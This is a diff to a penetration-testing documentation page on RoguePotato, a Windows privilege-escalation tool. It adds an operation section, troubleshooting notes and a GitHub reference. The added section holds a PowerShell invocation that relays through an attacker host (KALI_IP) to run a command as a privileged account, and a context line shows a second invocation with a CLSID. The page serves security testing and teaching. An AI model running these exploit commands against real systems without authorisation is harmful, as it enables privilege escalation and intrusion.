@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/roguepotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Exercise the configured RoguePotato callback path
+
+**Run in:** Windows PowerShell. **Requires:** The required impersonation privilege, compatible host and a working remote OXID redirection setup; -r alone does not create that relay.
+
+```powershell
+.\RoguePotato.exe -r KALI_IP -e "cmd.exe /c whoami" -l 9999
+```
+
+**Read the result:** Trace the required callback/network path as well as the token and platform prerequisites.
+
+**If The callback never reaches the local resolver or process creation fails:** External connection setup and privileged impersonation are separate requirements; a listening port alone proves neither.
+
+**Next check:** Verify every relay leg and token prerequisite using the tool's documented setup; judge success by the returned process identity.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://github.com/antonioCoco/RoguePotato)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## RoguePotato.exe: choose the operation and read the result
 
@@ -114,3 +144,5 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8
 - [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
